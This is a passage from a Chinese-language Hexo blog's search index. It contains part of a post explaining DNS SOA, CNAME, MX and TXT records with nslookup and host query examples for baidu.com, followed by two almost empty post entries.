dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br>Nameserver <span class="hljs-number">110.242</span>.<span class="hljs-number">68.134</span>:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br>Nameserver <span class="hljs-number">112.80</span>.<span class="hljs-number">248.64</span>:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br>Nameserver <span class="hljs-number">240</span>e:bf:b801:<span class="hljs-number">1002</span>:<span class="hljs-number">0</span>:ff:b024:<span class="hljs-number">26</span>de:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br>Nameserver <span class="hljs-number">180.76</span>.<span class="hljs-number">76.92</span>:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br>Nameserver <span class="hljs-number">14.215</span>.<span class="hljs-number">178.80</span>:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br></code></pre></td></tr></table></figure><h1 id="CNAME记录"><a href="#CNAME记录" class="headerlink" title="CNAME记录"></a>CNAME记录</h1><h2 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h2><p>规范名称记录，将一个别名关联到另一个域名</p><h2 id="操作-4"><a href="#操作-4" class="headerlink" title="操作"></a>操作</h2><h3 id="查询-4"><a href="#查询-4" class="headerlink" title="查询"></a>查询</h3><h4 id="nslookup-type-CNAME-domain"><a href="#nslookup-type-CNAME-domain" class="headerlink" title="nslookup -type&#x3D;CNAME domain"></a>nslookup -type&#x3D;CNAME domain</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ nslookup -type=cname www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br>Server:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1801</span>:<span class="hljs-number">5</span>eba:<span class="hljs-number">9</span>c9e:<span class="hljs-number">5813</span>:ea08:<span class="hljs-number">23</span>f9<br>Address:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1801</span>:<span class="hljs-number">5</span>eba:<span class="hljs-number">9</span>c9e:<span class="hljs-number">5813</span>:ea08:<span class="hljs-number">23</span>f9#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>canonical name = www<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span>.<br><br>Authoritative answers can be found from:<br></code></pre></td></tr></table></figure><h4 id="host-t-CNAME-domain"><a href="#host-t-CNAME-domain" class="headerlink" title="host -t CNAME domain"></a>host -t CNAME domain</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ host -t cname www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br>www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> is an alias <span class="hljs-keyword">for</span> www<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span>.<br></code></pre></td></tr></table></figure><h1 id="MX记录"><a href="#MX记录" class="headerlink" title="MX记录"></a>MX记录</h1><h2 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h2><p>邮件交换记录，用于指定邮件服务器</p><h2 id="操作-5"><a href="#操作-5" class="headerlink" title="操作"></a>操作</h2><h3 id="查询-5"><a href="#查询-5" class="headerlink" title="查询"></a>查询</h3><h4 id="nslookup-type-MX-domain"><a href="#nslookup-type-MX-domain" class="headerlink" title="nslookup -type&#x3D;MX domain"></a>nslookup -type&#x3D;MX domain</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ nslookup -type=MX baidu<span class="hljs-selector-class">.com</span><br>Server:<span class="hljs-number">240</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1890</span>:<span class="hljs-number">930</span>d:dd4d:ca4d:dc8a:cc02<br>Address:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1890</span>:<span class="hljs-number">930</span>d:dd4d:ca4d:dc8a:cc02#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>baidu<span class="hljs-selector-class">.com</span>mail exchanger = <span class="hljs-number">15</span> mx<span class="hljs-selector-class">.n</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>mail exchanger = <span class="hljs-number">20</span> mx1<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>mail exchanger = <span class="hljs-number">20</span> usmx01<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>mail exchanger = <span class="hljs-number">20</span> jpmx<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>mail exchanger = <span class="hljs-number">10</span> mx<span class="hljs-selector-class">.maillb</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>mail exchanger = <span class="hljs-number">20</span> mx50<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br><br>Authoritative answers can be found from:<br><br>➜  ~ nslookup mx<span class="hljs-selector-class">.n</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span><br>Server:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1890</span>:<span class="hljs-number">930</span>d:dd4d:ca4d:dc8a:cc02<br>Address:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1890</span>:<span class="hljs-number">930</span>d:dd4d:ca4d:dc8a:cc02#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>Name:mx<span class="hljs-selector-class">.n</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span><br>Address: <span class="hljs-number">111.202</span>.<span class="hljs-number">115.85</span><br>Name:mx<span class="hljs-selector-class">.n</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span><br>Address: <span class="hljs-number">111.206</span>.<span class="hljs-number">215.185</span><br></code></pre></td></tr></table></figure><h4 id="host-t-mx-domain"><a href="#host-t-mx-domain" class="headerlink" title="host -t mx domain"></a>host -t mx domain</h4><h3 id="设置-1"><a href="#设置-1" class="headerlink" title="设置"></a>设置</h3><p>MX记录值必须为域名格式</p><p>设置MX记录值之前必须创建MX记录值的A记录</p><h1 id="TXT记录"><a href="#TXT记录" class="headerlink" title="TXT记录"></a>TXT记录</h1><h2 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h2><p>文本形式的DNS记录</p><p>常见的TXT记录有 SPF 、DKIM、DMAIC</p><h2 id="操作-6"><a href="#操作-6" class="headerlink" title="操作"></a>操作</h2><h3 id="查询-6"><a href="#查询-6" class="headerlink" title="查询"></a>查询</h3><h4 id="nslookup-type-txt-domain"><a href="#nslookup-type-txt-domain" class="headerlink" title="nslookup -type&#x3D;txt domain"></a>nslookup -type&#x3D;txt domain</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  ~ nslookup -<span class="hljs-built_in">type</span>=txt baidu.<span class="hljs-keyword">com</span><br>Server:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1801</span>:<span class="hljs-number">5</span>eb<span class="hljs-variable">a:9c9e</span>:<span class="hljs-number">5813</span>:ea08:<span class="hljs-number">23</span>f9<br>Address:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1801</span>:<span class="hljs-number">5</span>eb<span class="hljs-variable">a:9c9e</span>:<span class="hljs-number">5813</span>:ea08:<span class="hljs-number">23</span>f9#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>baidu.<span class="hljs-keyword">com</span>text = <span class="hljs-string">&quot;google-site-verification=GHb98-6msqyx_qqjGl5eRatD3QTHyVB6-xQ3gJB5UwM&quot;</span><br>baidu.<span class="hljs-keyword">com</span>text = <span class="hljs-string">&quot;v=spf1 include:spf1.baidu.com include:spf2.baidu.com include:spf3.baidu.com include:spf4.baidu.com a mx ptr -all&quot;</span><br>baidu.<span class="hljs-keyword">com</span>text = <span class="hljs-string">&quot;_globalsign-domain-verification=qjb28W2jJSrWj04NHpB0CvgK9tle5JkOq-EcyWBgnE&quot;</span><br><br>Authoritative answers can <span class="hljs-keyword">be</span> found from:<br><br></code></pre></td></tr></table></figure><h4 id="host-t-txt-domain"><a href="#host-t-txt-domain" class="headerlink" title="host -t txt domain"></a>host -t txt domain</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs excel">➜  ~ host -<span class="hljs-built_in">t</span> txt baidu.com<br>baidu.com descriptive <span class="hljs-built_in">text</span> <span class="hljs-string">&quot;v=spf1 include:spf1.baidu.com include:spf2.baidu.com include:spf3.baidu.com include:spf4.baidu.com a mx ptr -all&quot;</span><br>baidu.com descriptive <span class="hljs-built_in">text</span> <span class="hljs-string">&quot;_globalsign-domain-verification=qjb28W2jJSrWj04NHpB0CvgK9tle5JkOq-EcyWBgnE&quot;</span><br>baidu.com descriptive <span class="hljs-built_in">text</span> <span class="hljs-string">&quot;google-site-verification=GHb98-6msqyx_qqjGl5eRatD3QTHyVB6-xQ3gJB5UwM&quot;</span><br></code></pre></td></tr></table></figure><h3 id="设置-2"><a href="#设置-2" class="headerlink" title="设置"></a>设置</h3>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>dns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dns</tag>
      
      <tag>network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo_command</title>
    <link href="/2024/02/06/hexoblog/hexo_command/"/>
    <url>/2024/02/06/hexoblog/hexo_command/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一万小时定律</title>
    <link href="/2024/02/06/10000hours/"/>
    <url>/2024/02/06/10000hours/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>life</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
